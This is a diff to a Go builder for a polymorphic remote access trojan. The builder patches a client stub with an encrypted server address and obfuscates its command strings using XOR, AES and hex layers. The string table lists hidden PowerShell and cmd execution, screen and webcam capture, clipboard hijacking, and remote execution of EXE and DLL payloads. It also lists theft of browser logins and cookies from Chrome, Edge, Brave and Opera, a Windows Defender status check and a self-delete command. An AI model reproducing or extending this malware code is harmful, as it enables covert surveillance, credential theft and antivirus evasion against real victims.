@@ -42,48 +42,44 @@ func main() {
 	ip := flag.String("ip", "127.0.0.1", "Server IP address")
 	port := flag.Int("port", 4444, "Server Port")
 	flag.Parse()
-
 	args := flag.Args()
 	if len(args) >= 1 { *ip = args[0] }
 	if len(args) >= 2 { fmt.Sscanf(args[1], "%d", port) }
 
 	fmt.Printf("[+] Building polymorphic client for %s:%d\n", *ip, *port)
-
-	stubPath := "stub.exe"
-	if _, err := os.Stat(stubPath); os.IsNotExist(err) {
-		stubPath = "client/client_c.exe"
-		if _, err := os.Stat(stubPath); os.IsNotExist(err) {
-			log.Fatalf("[-] Error: stub.exe not found.")
-		}
-	}
-
+	stubPath := "client/client_c.exe"
+	if _, err := os.Stat(stubPath); os.IsNotExist(err) { log.Fatalf("[-] stub not found") }
 	data, err := ioutil.ReadFile(stubPath)
-	if err != nil { log.Fatalf("[-] Error reading stub: %v", err) }
+	if err != nil { log.Fatalf("[-] Error reading stub") }
 
 	indices := findMarkerIndices(data)
 	targetIndex := selectTargetIndex(data, indices)
-	if targetIndex == -1 { log.Fatalf("[-] Error: Placeholder not found.") }
+	if targetIndex == -1 { log.Fatalf("[-] Placeholder not found") }
 
 	meta := generateMetadata()
 
+	// MUST MATCH StringIndex enum in utils.h EXACTLY
 	rawStrings := []string{
 		"ping", "pong", "[msg] ", "Message", "ok", "[exec_ps]", "[ps_output]", "[exec_cmd]", "[cmd_output]",
 		"[screen_stop]", "[cam_stop]", "[tasklist]", "[taskkill]", "[ls]", "[download]", "[delete]", "[mkdir]",
 		"[upload]", "[rename]", "[rfe_exe]", "[rfe_dll]", "[browser_collect]", "[clipboard_get]", "[clipboard_set]",
 		"[uninstall]", "[close]", "[reconnect]", "[set_delay]", "[screen_start]", "[cam_start]", "[sysinfo]",
-		"response", "command", "session", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", "CurrentBuild",
-		"DisplayVersion", "ReleaseId", "SOFTWARE", "SOFTWARE\\Microsoft\\Windows Defender", "DisableAntiSpyware",
+		"response", "command", "session",
+		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", "CurrentBuild", "DisplayVersion", "ReleaseId",
+		"SOFTWARE", "SOFTWARE\\Microsoft\\Windows Defender", "DisableAntiSpyware",
 		"SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000", "DriverDesc",
 		"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "ProcessorNameString", "client/1.0", "ipinfo.io",
-		"/country", "C:\\", "Unknown", "Windows Defender", "??", "[ls_result]", "[tasklist_result]", "[taskkill_result]",
-		"path", "sep", "name", "type", "drive", "size", "mtime", "items", "dir", "file", "error", "Directory not found or access denied",
-		"File not found or access denied", "Cannot delete", "mkdir failed", "-NoProfile -NonInteractive -WindowStyle Hidden -Command \"%s\"", "/c %s", "screen.jpg",
-		"[screen_frame]", "cam.jpg", "[cam_frame]", "[clipboard_result]", "ERR:OpenClipboard failed", "ERR:GlobalLock failed", "[clipboard_set_result]",
-		"ERR:OpenClipboard failed", "ERR:GlobalAlloc failed", "ERR:SetClipboardData failed", "[rfe_result]", "error:Download failed", "error:CreateProcess failed",
-		"error:rundll32 failed", "tmp_exe.exe", "tmp_dll.dll", "rundll32.exe", "pid", "name", "cpu", "mem", "ok:PID %lu terminated",
-		"Chrome", "Edge", "Brave", "Opera", "Google\\Chrome\\User Data", "Microsoft\\Edge\\User Data", "BraveSoftware\\Brave-Browser\\User Data",
-		"Opera Software\\Opera Stable", "chrome.dll", "msedge.dll", "launcher_lib.dll", "Login Data", "Cookies", "Web Data", "Network\\Cookies",
-		"Default", "Profile ", "OSCrypt.AppBoundProvider.Decrypt.ResultCode", "cmd /c ping -n 2 127.0.0.1 > nul && del /f /q \"%s\"",
+		"/country", "C:\\", "Unknown", "Windows Defender", "??", "[ls_result]", "[tasklist_result]",
+		"pid", "name", "cpu", "mem", "[taskkill_result]", "ok:PID %lu terminated",
+		"-NoProfile -NonInteractive -WindowStyle Hidden -Command \"%s\"", "/c %s", "screen.jpg", "[screen_frame]",
+		"cam.jpg", "[cam_frame]", "[clipboard_result]", "ERR:OpenClipboard failed", "ERR:GlobalLock failed",
+		"[clipboard_set_result]", "ERR:OpenClipboard failed", "ERR:GlobalAlloc failed", "ERR:SetClipboardData failed",
+		"[rfe_result]", "error:Download failed", "error:CreateProcess failed", "error:rundll32 failed", "tmp_exe.exe",
+		"tmp_dll.dll", "rundll32.exe", "Chrome", "Edge", "Brave", "Opera", "Google\\Chrome\\User Data", "Microsoft\\Edge\\User Data",
+		"BraveSoftware\\Brave-Browser\\User Data", "Opera Software\\Opera Stable", "chrome.dll", "msedge.dll", "launcher_lib.dll",
+		"Login Data", "Cookies", "Web Data", "Network\\Cookies", "Default", "Profile ", "OSCrypt.AppBoundProvider.Decrypt.ResultCode",
+		"cmd /c ping -n 2 127.0.0.1 > nul && del /f /q \"%s\"", "error", "path", "sep", "name", "type", "drive", "size", "mtime",
+		"items", "dir", "file", "Directory not found or access denied", "File not found or access denied", "Cannot delete", "mkdir failed",
 	}
 
 	obfStrings := make([]string, len(rawStrings))
@@ -98,7 +94,7 @@ func main() {
 	metaBuf := new(bytes.Buffer)
 	binary.Write(metaBuf, binary.LittleEndian, meta)
 
-	finalPayload := make([]byte, 2032)
+	finalPayload := make([]byte, 8176)
 	copy(finalPayload, metaBuf.Bytes())
 	copy(finalPayload[metaBuf.Len():], encryptedConfig)
 
@@ -128,11 +124,12 @@ func generateMetadata() ObfMetadata {
 
 func applyPolymorphicObf(s string, m ObfMetadata) string {
 	data := []byte(s)
+	// Transforms: 0:XOR1, 1:AES, 2:B64, 4:Hex, 9:XOR2
 	for _, t := range m.TransformOrder[:m.TransformCount] {
 		switch t {
 		case 0: for i := range data { data[i] ^= m.XorKey1 }
 		case 1: data = encryptAES(data, m.AesKey[:], m.AesIv[:])
-		case 2: data = []byte(hex.EncodeToString(data)) // Simulating Base64 layer via hex for stability
+		case 2: data = []byte(hex.EncodeToString(data))
 		case 4: data = []byte(hex.EncodeToString(data))
 		case 9: for i := range data { data[i] ^= m.XorKey2 }
 		}
@@ -170,9 +167,9 @@ func selectTargetIndex(data []byte, indices []int) int {
 	maxZeros := -1
 	target := -1
 	for _, idx := range indices {
-		if idx+len(marker)+2032 > len(data) { continue }
+		if idx+len(marker)+8176 > len(data) { continue }
 		zeros := 0
-		for i := 0; i < 2032; i++ {
+		for i := 0; i < 8176; i++ {
 			if data[idx+len(marker)+i] == 0 { zeros++ }
 		}
 		if zeros > maxZeros { maxZeros = zeros; target = idx }
